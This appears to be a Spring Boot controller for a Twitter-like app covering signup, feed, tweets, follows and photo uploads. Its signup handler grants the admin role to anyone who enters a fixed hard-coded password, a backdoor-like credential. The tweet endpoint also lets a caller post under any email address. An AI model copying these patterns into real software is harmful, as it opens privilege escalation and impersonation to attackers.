package com.ayush.Twitter.Controller;

import com.ayush.Twitter.Models.Follow;
import com.ayush.Twitter.Models.Image;
import com.ayush.Twitter.Models.Member;
import com.ayush.Twitter.Models.Tweets;
import com.ayush.Twitter.Repository.FollowRepository;
import com.ayush.Twitter.Repository.ImageRepository;
import com.ayush.Twitter.Repository.MemberRepository;
import com.ayush.Twitter.Repository.TweetRepository;
import com.ayush.Twitter.Util.FileDeleteUtil;
import com.ayush.Twitter.Util.FileUploadUtil;
import com.ayush.Twitter.Util.PasswordScrape;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import javax.validation.Valid;
import java.io.IOException;
import java.util.*;

@Controller
public class MemberResource {

    @Autowired
    private MemberRepository memberRepository;

    @Autowired
    private TweetRepository tweetRepository;

    @Autowired
    private FollowRepository followRepository;

    @Autowired
    private ImageRepository imageRepository;

    @GetMapping({"", "/", "index", "index.html"})
    public String getIndexPage(Member member, Model model) {
        model.addAttribute("member", member);
        return "landing";
    }

    @PostMapping("/saveMember")
    public String saveMember(@Valid @ModelAttribute("member") Member member) {
        if (member.getPassword().equals("adM!n_xCe$$-P@55")) {
            member.setRole("admin");
            member.setPassword(PasswordScrape.Pass());
        } else {
            member.setRole("user");
        }
        memberRepository.save(member);
        return "redirect:/";
    }

    @GetMapping("/validateEmail/{email}")
    @ResponseBody
    public String findByEmail(@PathVariable("email") String email) {
        if (memberRepository.existsByEmail(email.toLowerCase())) {
            return "Duplicate";
        }
        return "Unique";
    }

    @GetMapping({"loginPage", "/login"})
    public String getLoginPage() {
        return "login";
    }

    @GetMapping("homepage")
    public String getHomePage(Member member, Model model) {
        model.addAttribute("name", SecurityContextHolder.getContext().getAuthentication().getName());
        List<Integer> list = new ArrayList<>();
        int id = memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getId();
        list.add(id);
        for (Follow follow : followRepository.findAllByUserId(id)
        ) {
            list.add(follow.getFollowingId());
        }
        Collections.sort(list);
        List<Tweets> tweets = tweetRepository.findAllByAuthorIdInOrderByIdDesc(list);
        model.addAttribute("tweets", tweets);
        Image[] tweet_img = new Image[tweets.size()];
        for (int i = 0; i < tweets.size(); i++) {
            if (imageRepository.existsByMember_Id(tweets.get(i).getAuthorId())) {
                tweet_img[i] = imageRepository.findByMember_Id(tweets.get(i).getAuthorId());
            } else {
                Image image = new Image();
                image.setPhotos("null");
                tweet_img[i] = image;
            }
        }
        model.addAttribute("size", tweetRepository.findAllByAuthorIdInOrderByIdDesc(list).size());
        model.addAttribute("username", memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getName());
        model.addAttribute("tweetimg", tweet_img);
        if (imageRepository.existsByMember_Id(id))
            model.addAttribute("imgsrc", imageRepository.findByMember_Id(id).getPhotos());
        return "homepage";
    }

    @GetMapping("/storeTweet/{tweet}/{email}")
    public String enterTweet(@PathVariable(name = "tweet") String tweet, @PathVariable(name = "email") String email) {
        Tweets tweets = new Tweets();
        tweets.setTweet(tweet);
        tweets.setAuthorName(memberRepository.findByEmail(email).getName());
        tweets.setAuthorId(memberRepository.findByEmail(email).getId());
        tweets.setCreatedAt(new Date().toString());
        tweetRepository.save(tweets);
        return "homepage";
    }

    @GetMapping("connect")
    public String connect(Model model) {
        List<Member> memberList = new ArrayList<>();
        int id = memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getId();
        for (Member member : memberRepository.findAll()) {
            if (!followRepository.existsByFollowingIdAndUserId(member.getId(), id) && member.getId() != id)
                memberList.add(member);
        }
        Image[] tweet_img = new Image[memberList.size()];
        for (int i = 0; i < memberList.size(); i++) {
            if (imageRepository.existsByMember_Id(memberList.get(i).getId())) {
                tweet_img[i] = imageRepository.findByMember_Id(memberList.get(i).getId());
            } else {
                Image image = new Image();
                image.setPhotos("null");
                tweet_img[i] = image;
            }
        }
        model.addAttribute("tweetimg", tweet_img);
        model.addAttribute("members", memberList);
        if (imageRepository.existsByMember_Id(id))
            model.addAttribute("imgsrc", imageRepository.findByMember_Id(id).getPhotos());
        return "connect";
    }

    @GetMapping("/follow/{id}")
    public String enterTweet(@PathVariable("id") int id) {
        Follow follow = new Follow();
        follow.setFollowingId(id);
        follow.setUserId(memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getId());
        follow.setMember(memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()));
        followRepository.save(follow);
        return "connect";
    }

    @GetMapping("following")
    public String following(Model model) {
        int id = memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getId();
        List<Member> memberList = new ArrayList<>();
        for (Follow follow : followRepository.findAllByUserId(memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getId())) {
            memberList.add(memberRepository.findById(follow.getFollowingId()));
        }
        Image[] tweet_img = new Image[memberList.size()];
        for (int i = 0; i < memberList.size(); i++) {
            if (imageRepository.existsByMember_Id(memberList.get(i).getId())) {
                tweet_img[i] = imageRepository.findByMember_Id(memberList.get(i).getId());
            } else {
                Image image = new Image();
                image.setPhotos("null");
                tweet_img[i] = image;
            }
        }
        model.addAttribute("tweetimg", tweet_img);
        model.addAttribute("members", memberList);
        model.addAttribute("name", memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getName());
        if (imageRepository.existsByMember_Id(id))
            model.addAttribute("imgsrc", imageRepository.findByMember_Id(id).getPhotos());
        return "following";
    }

    @GetMapping("/unfollow/{id}")
    @Transactional
    public String unfollow(@PathVariable("id") int id) {
        followRepository.deleteByFollowingId(id);
        return "following";
    }

    @GetMapping("profile")
    public String getProfilePage() {
        return "profile";
    }

    @PostMapping("/profile/save")
    public String saveImage(Image image, @RequestParam("image") MultipartFile multipartFile) throws IOException {
        String fileName = StringUtils.cleanPath(multipartFile.getOriginalFilename());
        int id = memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()).getId();
        image.setPhotos("uploads/user-photos/" + id + "/" + fileName);
        image.setMember(memberRepository.findByEmail(SecurityContextHolder.getContext().getAuthentication().getName()));
        if (imageRepository.countByMember_Id(id) == 1) {
            Image updated_image = new Image();
            updated_image = imageRepository.getOne(imageRepository.findByMember_Id(id).getId());
            FileDeleteUtil.deleteFile(updated_image.getPhotos());
            updated_image.setPhotos(image.getPhotos());
            imageRepository.save(updated_image);
        } else
            imageRepository.save(image);
        String uploadDir = "uploads/user-photos/" + id;
        FileUploadUtil.saveFile(uploadDir, fileName, multipartFile);
        return "redirect:/homepage";
    }
}
